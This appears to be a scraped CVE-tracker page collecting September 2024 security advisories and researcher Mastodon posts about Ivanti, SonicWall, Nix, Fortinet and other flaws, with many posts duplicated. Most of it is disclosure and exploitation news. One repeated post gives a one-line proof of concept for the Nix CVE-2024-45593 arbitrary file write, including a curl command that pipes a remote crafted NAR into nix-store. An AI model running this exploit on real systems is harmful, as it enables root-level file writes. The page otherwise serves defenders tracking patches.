#curl security advisory: CVE-2024-8096: OCSP stapling bypass with GnuTLS

https://curl.se/docs/CVE-2024-8096.html

##
bagder@mastodon.social at 2024-09-11T05:49:13.000Z ##

#curl security advisory: CVE-2024-8096: OCSP stapling bypass with GnuTLS

https://curl.se/docs/CVE-2024-8096.html

##

CVE-2024-8190
(7.2 HIGH)

EPSS: 0.04%

updated 2024-09-11T16:26:11.920000

2 posts

An OS command injection vulnerability in Ivanti Cloud Services Appliance versions 4.6 Patch 518 and before allows a remote authenticated attacker to obtain remote code execution. The attacker must have admin level privileges to exploit this vulnerability.

screaminggoat at 2024-09-10T14:57:28.320Z ##

Ivanti security advisory: September 2024 Security Update
Happy #PatchTuesday from Ivanti. There are some serious vulnerabilities. I want to emphasize that Ivanti stated they "have no evidence of these vulnerabilities being exploited in the wild." See the following advisories:

  • Security Advisory EPM September 2024 for EPM 2024 and EPM 2022
  • Security Advisory Ivanti Cloud Service Appliance (CSA) (CVE-2024-8190)
  • Security Advisory Ivanti Workspace Control (IWC)

The big ones:

  • CVE-2024-29847 (perfect 10.0 critical 🥳 cc: @cR0w) deserialization in the agent portal of Ivanti EPM before 2022 SU6/September 2024 update allows unauth RCE
  • CVE-2024-32840, CVE-2024-32842, CVE-2024-32843, CVE-2024-32845, CVE-2024-32846, CVE-2024-32848, CVE-2024-34783, CVE-2024-34785: unspecified SQL injection in Ivanti EPM before 2022 SU6/September 2024 update allow remote authenticated attacker with admin privileges to RCE

#ivanti #vulnerability #cve #epm #iwc #csa

##
screaminggoat@infosec.exchange at 2024-09-10T14:57:28.000Z ##

Ivanti security advisory: September 2024 Security Update
Happy #PatchTuesday from Ivanti. There are some serious vulnerabilities. I want to emphasize that Ivanti stated they "have no evidence of these vulnerabilities being exploited in the wild." See the following advisories:

  • Security Advisory EPM September 2024 for EPM 2024 and EPM 2022
  • Security Advisory Ivanti Cloud Service Appliance (CSA) (CVE-2024-8190)
  • Security Advisory Ivanti Workspace Control (IWC)

The big ones:

  • CVE-2024-29847 (perfect 10.0 critical 🥳 cc: @cR0w) deserialization in the agent portal of Ivanti EPM before 2022 SU6/September 2024 update allows unauth RCE
  • CVE-2024-32840, CVE-2024-32842, CVE-2024-32843, CVE-2024-32845, CVE-2024-32846, CVE-2024-32848, CVE-2024-34783, CVE-2024-34785: unspecified SQL injection in Ivanti EPM before 2022 SU6/September 2024 update allow remote authenticated attacker with admin privileges to RCE

##

CVE-2024-40766
(9.8 CRITICAL)

EPSS: 1.02%

updated 2024-09-11T11:14:14.817000

38 posts

An improper access control vulnerability has been identified in the SonicWall SonicOS management access, potentially leading to unauthorized resource access and in specific conditions, causing the firewall to crash. This issue affects SonicWall Firewall Gen 5 and Gen 6 devices, as well as Gen 7 devices running SonicOS 7.0.1-5035 and older versions.

decio at 2024-09-10T06:35:41.632Z ##

[related]
⚠️
La vulnerabilité du protocole SSLVPN de SonicWall est désormais exploitee dans les attaques par ransomware/exfiltration
👇
https://www.bleepingcomputer.com/news/security/critical-sonicwall-sslvpn-bug-exploited-in-ransomware-attacks/

Dans le cadre d'activités récentes observées par Arctic Wolf, les affiliés du ransomware Akira ont mené des attaques par ransomware avec un vecteur d'accès initial impliquant la compromission de comptes d'utilisateurs SSLVPN sur des appareils SonicWall.
👇
https://arcticwolf.com/resources/blog/arctic-wolf-observes-akira-ransomware-campaign-targeting-sonicwall-sslvpn-accounts/

"Au 9 septembre 2024, Rapid7 a connaissance de plusieurs incidents récents (à la fois externes et observés par Rapid7) dans lesquels des comptes SSLVPN SonicWall ont été ciblés ou compromis, y compris par des groupes de ransomware ; les preuves liant CVE-2024-40766 à ces incidents sont encore circonstancielles, mais compte tenu de l'intérêt des adversaires pour le logiciel en général, Rapid7 recommande fortement de remédier à la situation en urgence. Les vulnérabilités telles que CVE-2024-40766 sont fréquemment utilisées pour l'accès initial aux environnements des victimes."
👇
https://www.rapid7.com/blog/post/2024/09/09/etr-cve-2024-40766-critical-improper-access-control-vulnerability-affecting-sonicwall-devices/

[edit: ajout information]

L'ajout hier de cette vulnérabilité au Catalogue KEV (Known Exploited Vulnerabilities) par la CISA américaine vient confirmer son exploitation avérée par des groupes de cybercriminels comme point d’entrée.
👇
https://www.cisa.gov/news-events/alerts/2024/09/09/cisa-adds-three-known-exploited-vulnerabilities-catalog

(Merci @screaminggoat pour l'avoir signalé)

[mesure de mitigation + mise à jour]
⬇️
"Pour minimiser l'impact potentiel, nous recommandons de limiter la gestion du pare-feu aux sources de confiance ou de désactiver la gestion du pare-feu WAN à partir de l'accès à l'internet. De même, pour SSLVPN, veuillez vous assurer que l'accès est limité aux sources de confiance, ou désactivez l'accès SSLVPN depuis l'internet."

"Appliquez le correctif dès que possible pour les produits concernés. Les dernières versions du correctif peuvent être téléchargées sur mysonicwall.com."
👇
https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2024-0015

#CVE_2024_40766
#CyberVeille #SonicWall #ransomware

##
screaminggoat at 2024-09-09T18:44:21.714Z ##

Rapid7: CVE-2024-40766: Critical Improper Access Control Vulnerability Affecting SonicWall Devices
See parent toot above for further information about CVE-2024-40766.

As of September 9, 2024, Rapid7 is aware of several recent incidents (both external and Rapid7-observed) in which SonicWall SSLVPN accounts were targeted or compromised, including by ransomware groups; evidence linking CVE-2024-40766 to these incidents is still circumstantial, but given adversary interest in the software in general, Rapid7 strongly recommends remediating on an emergency basis. Vulnerabilities like CVE-2024-40766 are frequently used for initial access to victim environments.

See related CISA alert: CISA Adds Three Known Exploited Vulnerabilities to Catalog

#cisa #kev #cve_2024_40766 #sonicwall #ransomware #vulnerability #eitw #activeexploitation #SSLVPN #sonicos

##
screaminggoat at 2024-09-09T14:57:41.684Z ##

CISA: CISA Adds Three Known Exploited Vulnerabilities to Catalog
Hot off the press! EDIT: Page is now live. CISA added the following three vulnerabilities to the KEV Catalog:

  • CVE-2016-3714 (8.4 high) ImageMagick Improper Input Validation Vulnerability
  • CVE-2017-1000253 (7.8 high) Linux Kernel PIE Stack Buffer Corruption Vulnerability
    • Known To Be Used in Ransomware Campaigns? Known
  • CVE-2024-40766 (9.3 critical) SonicWall SonicOS Improper Access Control Vulnerability

Note: Arctic Wolf alleges CVE-2024-40766 exploitation in the wild by Akira ransomware affiliates: Arctic Wolf Observes Akira Ransomware Campaign Targeting SonicWall SSLVPN Accounts

cc: @neurovagrant @goatyell @ntkramer @hrbrmstr

#kev #cisa #vulnerability #eitw #activeexploitation #CVE_2024_40766 #CVE_2017_1000253 #CVE_2016_3714 #imagemagick #linux #sonicwall #sonicos #sslvpn #cisakev

##
screaminggoat at 2024-09-09T12:38:27.898Z ##

Arctic Wolf: Arctic Wolf Observes Akira Ransomware Campaign Targeting SonicWall SSLVPN Accounts
Reference: CVE-2024-40766 (CVSSv3.1: 9.3 critical, disclosed 22 August 2024 by SonicWall, reported possible exploitation in the wild on 06 September 2024) SonicWall SSLVPN improper access control vulnerability.

Arctic Wolf implies that Akira ransomware affiliates exploited CVE-2024-40766. No indicators of compromise were provided. In carefully worded terms, they allude to Akira ransomware attacks with an initial access vector involving the compromise of SSLVPN user accounts on SonicWall devices.

In each instance, the compromised accounts were local to the devices themselves rather than being integrated with a centralized authentication solution such as Microsoft Active Directory. Additionally, MFA was disabled for all compromised accounts, and the SonicOS firmware on the affected devices were within the versions known to be vulnerable to CVE-2024-40766.

cc: @campuscodi @goatyell

#threatintel #CVE_2024_40766 #vulnerability #eitw #activeexploitation #ransomware #infosec #cybersecurity #akira #sonicwall #sslvpn

##
screaminggoat at 2024-09-06T17:19:01.588Z ##

SonicWall updated their security advisory for CVE-2024-40766 (CVSSv3.1: 9.3 critical) on 06 September 2024, stating "This vulnerability is potentially being exploited in the wild." (see parent toot above for the security advisory).
An interesting point is that they originally revised the CVSS score on 23 August 2024 from 8.6 to 9.3, and then added the recommendation "SonicWall strongly advises SSLVPN users with local accounts should change their passwords and enable MFA." on 28 August 2024.

See related Bleeping Computer reporting: SonicWall SSLVPN access control flaw is now exploited in attacks

#CVE_2024_40766 #sonicwall #vulnerability #CVE #eitw #activeexploitation

##
decio at 2024-09-06T15:13:18.676Z ##

⚠️ SonicWall a mis à jour son avis de sécurité concernant la vulnérabilité CVE-2024-40766, ajoutant que l’interface #SSLVPN pourrait également être impactée. Ils signalent aussi des signes d’exploitation potentielle sur internet. Si vous administrez un de ces modèles, Il est essentiel de sécuriser ces systèmes rapidement pour éviter toute exploitation malveillante
⬇️
"SonicOS Improper Access Control Vulnerability"
👇
https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2024-0015

"SonicWall updated its advisory on Friday to inform customers that “this vulnerability is potentially being exploited in the wild”
👇
https://www.securityweek.com/recent-sonicwall-firewall-vulnerability-potentially-exploited-in-the-wild/

#CVE_2024_40766
#CyberVeille #SonicWall

##
decio@infosec.exchange at 2024-09-10T06:35:41.000Z ##

[related]
⚠️
La vulnerabilité du protocole SSLVPN de SonicWall est désormais exploitee dans les attaques par ransomware/exfiltration
👇
https://www.bleepingcomputer.com/news/security/critical-sonicwall-sslvpn-bug-exploited-in-ransomware-attacks/

Dans le cadre d'activités récentes observées par Arctic Wolf, les affiliés du ransomware Akira ont mené des attaques par ransomware avec un vecteur d'accès initial impliquant la compromission de comptes d'utilisateurs SSLVPN sur des appareils SonicWall.
👇
https://arcticwolf.com/resources/blog/arctic-wolf-observes-akira-ransomware-campaign-targeting-sonicwall-sslvpn-accounts/

"Au 9 septembre 2024, Rapid7 a connaissance de plusieurs incidents récents (à la fois externes et observés par Rapid7) dans lesquels des comptes SSLVPN SonicWall ont été ciblés ou compromis, y compris par des groupes de ransomware ; les preuves liant CVE-2024-40766 à ces incidents sont encore circonstancielles, mais compte tenu de l'intérêt des adversaires pour le logiciel en général, Rapid7 recommande fortement de remédier à la situation en urgence. Les vulnérabilités telles que CVE-2024-40766 sont fréquemment utilisées pour l'accès initial aux environnements des victimes."
👇
https://www.rapid7.com/blog/post/2024/09/09/etr-cve-2024-40766-critical-improper-access-control-vulnerability-affecting-sonicwall-devices/

[edit: ajout information]

L'ajout hier de cette vulnérabilité au Catalogue KEV (Known Exploited Vulnerabilities) par la CISA américaine vient confirmer son exploitation avérée par des groupes de cybercriminels comme point d’entrée.
👇
https://www.cisa.gov/news-events/alerts/2024/09/09/cisa-adds-three-known-exploited-vulnerabilities-catalog

(Merci @screaminggoat pour l'avoir signalé)

[mesure de mitigation + mise à jour]
⬇️
"Pour minimiser l'impact potentiel, nous recommandons de limiter la gestion du pare-feu aux sources de confiance ou de désactiver la gestion du pare-feu WAN à partir de l'accès à l'internet. De même, pour SSLVPN, veuillez vous assurer que l'accès est limité aux sources de confiance, ou désactivez l'accès SSLVPN depuis l'internet."

"Appliquez le correctif dès que possible pour les produits concernés. Les dernières versions du correctif peuvent être téléchargées sur mysonicwall.com."
👇
https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2024-0015

#CVE_2024_40766
#CyberVeille #SonicWall #ransomware

##
screaminggoat@infosec.exchange at 2024-09-09T18:44:21.000Z ##

Rapid7: CVE-2024-40766: Critical Improper Access Control Vulnerability Affecting SonicWall Devices
See parent toot above for further information about CVE-2024-40766.

As of September 9, 2024, Rapid7 is aware of several recent incidents (both external and Rapid7-observed) in which SonicWall SSLVPN accounts were targeted or compromised, including by ransomware groups; evidence linking CVE-2024-40766 to these incidents is still circumstantial, but given adversary interest in the software in general, Rapid7 strongly recommends remediating on an emergency basis. Vulnerabilities like CVE-2024-40766 are frequently used for initial access to victim environments.

See related CISA alert: CISA Adds Three Known Exploited Vulnerabilities to Catalog

#cisa #kev #cve_2024_40766 #sonicwall #ransomware #vulnerability #eitw #activeexploitation #SSLVPN #sonicos

##
screaminggoat@infosec.exchange at 2024-09-09T14:57:41.000Z ##

CISA: CISA Adds Three Known Exploited Vulnerabilities to Catalog
Hot off the press! EDIT: Page is now live. CISA added the following three vulnerabilities to the KEV Catalog:

  • CVE-2016-3714 (8.4 high) ImageMagick Improper Input Validation Vulnerability
  • CVE-2017-1000253 (7.8 high) Linux Kernel PIE Stack Buffer Corruption Vulnerability
    • Known To Be Used in Ransomware Campaigns? Known
  • CVE-2024-40766 (9.3 critical) SonicWall SonicOS Improper Access Control Vulnerability

Note: Arctic Wolf alleges CVE-2024-40766 exploitation in the wild by Akira ransomware affiliates: Arctic Wolf Observes Akira Ransomware Campaign Targeting SonicWall SSLVPN Accounts

cc: @neurovagrant @goatyell @ntkramer @hrbrmstr

#kev #cisa #vulnerability #eitw #activeexploitation #CVE_2024_40766 #CVE_2017_1000253 #CVE_2016_3714 #imagemagick #linux #sonicwall #sonicos #sslvpn #cisakev

##
screaminggoat@infosec.exchange at 2024-09-09T12:38:27.000Z ##

Arctic Wolf: Arctic Wolf Observes Akira Ransomware Campaign Targeting SonicWall SSLVPN Accounts
Reference: CVE-2024-40766 (CVSSv3.1: 9.3 critical, disclosed 22 August 2024 by SonicWall, reported possible exploitation in the wild on 06 September 2024) SonicWall SSLVPN improper access control vulnerability.

Arctic Wolf implies that Akira ransomware affiliates exploited CVE-2024-40766. No indicators of compromise were provided. In carefully worded terms, they allude to Akira ransomware attacks with an initial access vector involving the compromise of SSLVPN user accounts on SonicWall devices.

In each instance, the compromised accounts were local to the devices themselves rather than being integrated with a centralized authentication solution such as Microsoft Active Directory. Additionally, MFA was disabled for all compromised accounts, and the SonicOS firmware on the affected devices were within the versions known to be vulnerable to CVE-2024-40766.

cc: @campuscodi @goatyell

#threatintel #CVE_2024_40766 #vulnerability #eitw #activeexploitation #ransomware #infosec #cybersecurity #akira #sonicwall #sslvpn

##
screaminggoat@infosec.exchange at 2024-09-06T17:19:01.000Z ##

SonicWall updated their security advisory for CVE-2024-40766 (CVSSv3.1: 9.3 critical) on 06 September 2024, stating "This vulnerability is potentially being exploited in the wild." (see parent toot above for the security advisory).
An interesting point is that they originally revised the CVSS score on 23 August 2024 from 8.6 to 9.3, and then added the recommendation "SonicWall strongly advises SSLVPN users with local accounts should change their passwords and enable MFA." on 28 August 2024.

See related Bleeping Computer reporting: SonicWall SSLVPN access control flaw is now exploited in attacks

#CVE_2024_40766 #sonicwall #vulnerability #CVE #eitw #activeexploitation

Ils signalent aussi des signes d’exploitation potentielle sur internet. Si vous administrez un de ces modèles, Il est essentiel de sécuriser ces systèmes rapidement pour éviter toute exploitation malveillante
⬇️

oversecurity@mastodon.social at 2024-09-11T13:40:12.000Z ##

CISA Adds Three Critical Vulnerabilities to Known Exploited Vulnerabilities Catalog

The Cybersecurity and Infrastructure Security Agency (CISA) KEV Catalog adds CVE-2016-3714, CVE-2017-1000253, and CVE-2024-40766.

🔗️ [Cyble] https://link.is.it/2nxsl3

##
oversecurity@mastodon.social at 2024-09-10T15:10:05.000Z ##

CISA Adds Three Critical Vulnerabilities to Known Exploited Vulnerabilities Catalog

The Cybersecurity and Infrastructure Security Agency (CISA) KEV Catalog adds CVE-2016-3714, CVE-2017-1000253, and CVE-2024-40766.

🔗️ [Cyble] https://link.is.it/pnbily

##
jbhall56 at 2024-09-10T11:47:51.379Z ##

Tracked as CVE-2024-40766, this improper access control flaw affects Gen 5, Gen 6, and Gen 7 firewalls. SonicWall patched it on August 22 and warned that it only impacted the firewalls' management access interface. https://www.bleepingcomputer.com/news/security/critical-sonicwall-sslvpn-bug-exploited-in-ransomware-attacks/

##
screaminggoat at 2024-09-10T06:39:59.185Z ##

@decio CISA confirmed active exploitation of CVE-2024-40766 by adding it to the Known Exploited Vulnerabilities Catalog on Monday morning: https://www.cisa.gov/news-events/alerts/2024/09/09/cisa-adds-three-known-exploited-vulnerabilities-catalog

This isn't just a spur of the moment addition either. CISA investigates and confirms exploitation before adding a CVE to the KEV.

##
iulianvostrut@mastodon.social at 2024-09-10T03:50:01.000Z ##

Attention! Critical flaw in SonicWall devices being actively exploited by ransomware groups, including Akira. CVE-2024-40766 enables unauthorized access to SSLVPN user accounts. Take immediate action to secure your systems. Stay vigilant and update your security measures.

##

CVE-2017-1000253
(7.8 HIGH)

EPSS: 6.30%

updated 2024-09-11T11:12:20.577000

16 posts

Linux distributions that have not patched their long-term kernels with https://git.kernel.org/linus/a87938b2e246b81b4fb713edb371a9fa3c5c3c86 (committed on April 14, 2015). This kernel vulnerability was fixed in April 2015 by commit a87938b2e246b81b4fb713edb371a9fa3c5c3c86 (backported to Linux 3.10.77 in May 2015), but it was not recognized as a security threat. With CONFIG_ARCH_BINFMT_ELF_RANDOMIZ

2 repos

https://github.com/sxlmnwb/CVE-2017-1000253

https://github.com/RicterZ/PIE-Stack-Clash-CVE-2017-1000253

screaminggoat at 2024-09-09T14:57:41.684Z ##

CISA: CISA Adds Three Known Exploited Vulnerabilities to Catalog
Hot off the press! EDIT: Page is now live. CISA added the following three vulnerabilities to the KEV Catalog:

  • CVE-2016-3714 (8.4 high) ImageMagick Improper Input Validation Vulnerability
  • CVE-2017-1000253 (7.8 high) Linux Kernel PIE Stack Buffer Corruption Vulnerability
    • Known To Be Used in Ransomware Campaigns? Known
  • CVE-2024-40766 (9.3 critical) SonicWall SonicOS Improper Access Control Vulnerability

Note: Arctic Wolf alleges CVE-2024-40766 exploitation in the wild by Akira ransomware affiliates: Arctic Wolf Observes Akira Ransomware Campaign Targeting SonicWall SSLVPN Accounts

cc: @neurovagrant @goatyell @ntkramer @hrbrmstr

cisakevtracker@mastodon.social at 2024-09-10T02:59:08.000Z ##

CVE ID: CVE-2017-1000253
Vendor: Linux
Product: Kernel
Date Added: 2024-09-09
Vulnerability: Linux Kernel PIE Stack Buffer Corruption Vulnerability
Notes: This vulnerability affects a common open-source component, third-party library, or a protocol used by different products. For more information, please see: https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=a87938b2e246b81b4fb713edb371a9fa3c5c3c86; https://nvd.nist.gov/vuln/detail/CVE-2017-1000253
CVE URL: https://nvd.nist.gov/vuln/detail/CVE-2017-1000253

AAKL at 2024-09-09T14:11:18.529Z ##

- CVE-2016-3714: ImageMagick Improper Input Validation Vulnerability https://www.cve.org/CVERecord?id=CVE-2016-3714

- CVE-2017-1000253: #Linux Kernel PIE Stack Buffer Corruption Vulnerability (known) https://www.cve.org/CVERecord?id=CVE-2017-1000253

- CVE-2024-40766: #SonicWall SonicOS Improper Access Control Vulnerability https://www.cve.org/CVERecord?id=CVE-2024-40766 @cisacyber #cybersecurity #infosec

oversecurity@mastodon.social at 2024-09-11T13:40:12.000Z ##

CVE ID: CVE-2017-1000253
Vendor: Linux
Product: Kernel
Date Added: 2024-09-09
Vulnerability: Linux Kernel PIE Stack Buffer Corruption Vulnerability
Notes: This vulnerability affects a common open-source component, third-party library, or a protocol used by different products. For more information, please see: https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=a87938b2e246b81b4fb713edb371a9fa3c5c3c86; https://nvd.nist.gov/vuln/detail/CVE-2017-1000253
CVE URL: https://nvd.nist.gov/vuln/detail/CVE-2017-1000253

##

CVE-2016-3714
(8.4 HIGH)

EPSS: 97.36%

updated 2024-09-11T11:11:26.023000

12 posts

The (1) EPHEMERAL, (2) HTTPS, (3) MVG, (4) MSL, (5) TEXT, (6) SHOW, (7) WIN, and (8) PLT coders in ImageMagick before 6.9.3-10 and 7.x before 7.0.1-1 allow remote attackers to execute arbitrary code via shell metacharacters in a crafted image, aka "ImageTragick."

1 repos

#search_error

screaminggoat at 2024-09-09T14:57:41.684Z ##

CISA: CISA Adds Three Known Exploited Vulnerabilities to Catalog
Hot off the press! EDIT: Page is now live. CISA added the following three vulnerabilities to the KEV Catalog:

  • CVE-2016-3714 (8.4 high) ImageMagick Improper Input Validation Vulnerability
  • CVE-2017-1000253 (7.8 high) Linux Kernel PIE Stack Buffer Corruption Vulnerability
    • Known To Be Used in Ransomware Campaigns? Known
  • CVE-2024-40766 (9.3 critical) SonicWall SonicOS Improper Access Control Vulnerability

Note: Arctic Wolf alleges CVE-2024-40766 exploitation in the wild by Akira ransomware affiliates: Arctic Wolf Observes Akira Ransomware Campaign Targeting SonicWall SSLVPN Accounts

cc: @neurovagrant @goatyell @ntkramer @hrbrmstr

##

CVE-2024-43461
(8.8 HIGH)

EPSS: 0.09%

updated 2024-09-10T17:43:14.410000

6 posts

Windows MSHTML Platform Spoofing Vulnerability

screaminggoat at 2024-09-10T18:40:13.613Z ##

Zero Day Initiative: The September 2024 Security Update Review
Trend Micro and Zero Day Initiative dispute Microsoft's security advisory for CVE-2024-43461 (8.8 high) Windows MSHTML Platform Spoofing Vulnerability, stating that it is being actively exploited in the wild:

This bug is similar to the vulnerability we reported and was patched back in July. The ZDI Threat Hunting team discovered this exploit in the wild and reported it to Microsoft back in June. It appears threat actors quickly bypassed the previous patch. When we told Microsoft about the bug, we indicated it was being actively used. We’re not sure why they don’t list it as being under active attack, but you should treat it as though it were, especially since it affects all supported versions of Windows.

If Trend Micro/ZDI contacts Microsoft to get it changed, we may see this advisory updated. CISA would also likely add it to the KEV Catalog.

h/t: @TheDustinChilds

#CVE_2024_43461 #microsoft #vulnerability #eitw #cve #activeexploitation #kev #microsoft #patchtuesday

##
screaminggoat@infosec.exchange at 2024-09-10T18:40:13.000Z ##

Zero Day Initiative: The September 2024 Security Update Review
Trend Micro and Zero Day Initiative dispute Microsoft's security advisory for CVE-2024-43461 (8.8 high) Windows MSHTML Platform Spoofing Vulnerability, stating that it is being actively exploited in the wild:

This bug is similar to the vulnerability we reported and was patched back in July. The ZDI Threat Hunting team discovered this exploit in the wild and reported it to Microsoft back in June. It appears threat actors quickly bypassed the previous patch. When we told Microsoft about the bug, we indicated it was being actively used. We’re not sure why they don’t list it as being under active attack, but you should treat it as though it were, especially since it affects all supported versions of Windows.

If Trend Micro/ZDI contacts Microsoft to get it changed, we may see this advisory updated. CISA would also likely add it to the KEV Catalog.

h/t: @TheDustinChilds

##

CVE-2024-45593
(9.0 CRITICAL)

EPSS: 0.04%

updated 2024-09-10T17:43:14.410000

2 posts

Nix is a package manager for Linux and other Unix systems. A bug in Nix 2.24 prior to 2.24.6 allows a substituter or malicious user to craft a NAR that, when unpacked by Nix, causes Nix to write to arbitrary file system locations to which the Nix process has access. This will be with root permissions when using the Nix daemon. This issue is fixed in Nix 2.24.6.

delroth@delroth.net at 2024-09-10T18:16:00.000Z ##

Now that Nix 2.24.6 is out, my oneliner PoC for CVE-2024-45593:

$ nix-store --export $(nix-build -E '(import <nixpkgs> {}).runCommand "exploit" {} "mkdir -p $out/zzz; ln -s /root $out/foo; touch $out/zzz/pwned"') | sed 's/zzz/foo/' > pwned.nar

This creates a .nar which when imported into the Nix store by Nix 2.24 will write an empty file in /root

$ curl https://delroth.net/pwned.nar | nix-store --import

Rarely are LPE vulns so trivial to trigger and exploit.

##
delroth@delroth.net at 2024-09-10T18:16:00.000Z ##

Now that Nix 2.24.6 is out, my oneliner PoC for CVE-2024-45593:

$ nix-store --export $(nix-build -E '(import <nixpkgs> {}).runCommand "exploit" {} "mkdir -p $out/zzz; ln -s /root $out/foo; touch $out/zzz/pwned"') | sed 's/zzz/foo/' > pwned.nar

This creates a .nar which when imported into the Nix store by Nix 2.24 will write an empty file in /root

$ curl https://delroth.net/pwned.nar | nix-store --import

Rarely are LPE vulns so trivial to trigger and exploit.

##

CVE-2024-35282
(4.2 MEDIUM)

EPSS: 0.04%

updated 2024-09-10T15:50:47.237000

2 posts

A cleartext storage of sensitive information in memory vulnerability [CWE-316] affecting FortiClient VPN iOS 7.2 all versions, 7.0 all versions, 6.4 all versions, 6.2 all versions, 6.0 all versions may allow an unauthenticated attacker that has physical access to a jailbroken device to obtain cleartext passwords via keychain dump.

screaminggoat at 2024-09-10T15:10:50.860Z ##

At least 10 Fortinet security advisories. Happy #PatchTuesday from Fortinet:

  • FG-IR-22-256 CVE-2024-36511 (CVSSv3.1: 3.7 low) Cookie security policy bypass
  • FG-IR-22-282 CVE-2024-31489 (CVSSv3.1: 6.8 medium) FortiClient - Lack of client-side certificate validation in ZTNA service
  • FG-IR-22-230 CVE-2022-45856 (CVSSv3.1: 4.8 medium) FortiClient(All) - Lack of client-side certificate validation using SAML SSO
  • FG-IR-23-204 CVE-2023-44254 (CVSSv3.1: 5.0 medium) IDOR on download logs feature
  • FG-IR-24-123 CVE-2024-33508 (CVSSv3.1: 7.3 high) Improper Neutralization of Special Elements used in a Command in DAS component
  • FG-IR-24-048 CVE-2024-4863 (CVSSv3.1: 7.5 high) Inadequate user validation and no brute force protection on change password requests
  • FG-IR-23-362 CVE-2024-21753 (CVSSv3.1: 5.5 medium) Multiple path traversal in administrative interface
  • FG-IR-24-051 CVE-2024-31490 (CVSSv3.1: 4.3 medium) Sensitive files disclosure in diagnostic logs download
  • FG-IR-24-139 CVE-2024-35282 (CVSSv3.1: 4.2 medium) Unencrypted keychain permanent password
  • FG-IR-24-371 CVE-2024-45323 (CVSSv3.1: 4.3 medium) access to backend information and logs via RestAPI on shared environments

No mention of exploitation. Please note that Fortinet skews their displayed CVSS score (temporal) instead of showing base score, downplaying their severity. Read through these yourself to determine the best course of action

#fortinet #vulnerability #cve #fortios #forticlient

  • FG-IR-22-256 CVE-2024-36511 (CVSSv3.1: 3.7 low) Cookie security policy bypass
  • FG-IR-22-282 CVE-2024-31489 (CVSSv3.1: 6.8 medium) FortiClient - Lack of client-side certificate validation in ZTNA service
  • FG-IR-22-230 CVE-2022-45856 (CVSSv3.1: 4.8 medium) FortiClient(All) - Lack of client-side certificate validation using SAML SSO
  • FG-IR-23-204 CVE-2023-44254 (CVSSv3.1: 5.0 medium) IDOR on download logs feature
  • FG-IR-24-123 CVE-2024-33508 (CVSSv3.1: 7.3 high) Improper Neutralization of Special Elements used in a Command in DAS component
  • FG-IR-24-048 CVE-2024-4863 (CVSSv3.1: 7.5 high) Inadequate user validation and no brute force protection on change password requests
  • FG-IR-23-362 CVE-2024-21753 (CVSSv3.1: 5.5 medium) Multiple path traversal in administrative interface
  • FG-IR-24-051 CVE-2024-31490 (CVSSv3.1: 4.3 medium) Sensitive files disclosure in diagnostic logs download
  • FG-IR-24-139 CVE-2024-35282 (CVSSv3.1: 4.2 medium) Unencrypted keychain permanent password
  • FG-IR-24-371 CVE-2024-45323 (CVSSv3.1: 4.3 medium) access to backend information and logs via RestAPI on shared environments

No mention of exploitation. Please note that Fortinet skews their displayed CVSS score (temporal) instead of showing base score, downplaying their severity. Read through these yourself to determine the best course of action

  • FG-IR-23-362 CVE-2024-21753 (CVSSv3.1: 5.5 medium) Multiple path traversal in administrative interface
  • FG-IR-24-051 CVE-2024-31490 (CVSSv3.1: 4.3 medium) Sensitive files disclosure in diagnostic logs download
  • FG-IR-24-139 CVE-2024-35282 (CVSSv3.1: 4.2 medium) Unencrypted keychain permanent password
  • FG-IR-24-371 CVE-2024-45323 (CVSSv3.1: 4.3 medium) access to backend information and logs via RestAPI on shared environments

No mention of exploitation. Please note that Fortinet skews their displayed CVSS score (temporal) instead of showing base score, downplaying their severity. Read through these yourself to determine the best course of action

#fortinet #vulnerability #cve #fortios #forticlient

##

CVE-2024-33508
(7.3 HIGH)

EPSS: 0.04%

updated 2024-09-10T15:31:11

2 posts

An improper neutralization of special elements used in a command ('Command Injection') vulnerability [CWE-77] in Fortinet FortiClientEMS 7.2.0 through 7.2.4, 7.0.0 through 7.0.12 may allow an unauthenticated attacker to execute limited and temporary operations on the underlying database via crafted requests.

screaminggoat at 2024-09-10T15:10:50.860Z ##

At least 10 Fortinet security advisories. Happy #PatchTuesday from Fortinet:

  • FG-IR-22-256 CVE-2024-36511 (CVSSv3.1: 3.7 low) Cookie security policy bypass
  • FG-IR-22-282 CVE-2024-31489 (CVSSv3.1: 6.8 medium) FortiClient - Lack of client-side certificate validation in ZTNA service
  • FG-IR-22-230 CVE-2022-45856 (CVSSv3.1: 4.8 medium) FortiClient(All) - Lack of client-side certificate validation using SAML SSO
  • FG-IR-23-204 CVE-2023-44254 (CVSSv3.1: 5.0 medium) IDOR on download logs feature
  • FG-IR-24-123 CVE-2024-33508 (CVSSv3.1: 7.3 high) Improper Neutralization of Special Elements used in a Command in DAS component
  • FG-IR-24-048 CVE-2024-4863 (CVSSv3.1: 7.5 high) Inadequate user validation and no brute force protection on change password requests
  • FG-IR-23-362 CVE-2024-21753 (CVSSv3.1: 5.5 medium) Multiple path traversal in administrative interface
  • FG-IR-24-051 CVE-2024-31490 (CVSSv3.1: 4.3 medium) Sensitive files disclosure in diagnostic logs download
  • FG-IR-24-139 CVE-2024-35282 (CVSSv3.1: 4.2 medium) Unencrypted keychain permanent password
  • FG-IR-24-371 CVE-2024-45323 (CVSSv3.1: 4.3 medium) access to backend information and logs via RestAPI on shared environments

No mention of exploitation. Please note that Fortinet skews their displayed CVSS score (temporal) instead of showing base score, downplaying their severity. Read through these yourself to determine the best course of action

CVE-2024-45032
(10.0 CRITICAL)

EPSS: 0.04%

updated 2024-09-10T12:09:50.377000

1 posts

A vulnerability has been identified in Industrial Edge Management Pro (All versions < V1.9.5), Industrial Edge Management Virtual (All versions < V2.3.1-1). Affected components do not properly validate the device tokens. This could allow an unauthenticated remote attacker to impersonate other devices onboarded to the system.

CVE-2024-39715
(8.5 HIGH)

EPSS: 0.04%

updated 2024-09-09T18:31:36

2 posts

A code injection vulnerability that allows a low-privileged user with REST API access granted to remotely upload arbitrary files to the VSPC server using REST API, leading to remote code execution on VSPC server.

screaminggoat at 2024-09-05T14:07:10.779Z ##

Veeam Security Bulletin (September 2024). No mention of exploitation
Veeam Backup & Replication:

  • CVE-2024-40711 (9.8 critical) RCE
  • CVE-2024-40713 (8.8 high) MFA bypass
  • CVE-2024-40710 (8.8 high) RCE
  • CVE-2024-39718 (8.1 high) EoP file deletion
  • CVE-2024-40714 (8.3 high) TLS issue allows sensitive credentials interception
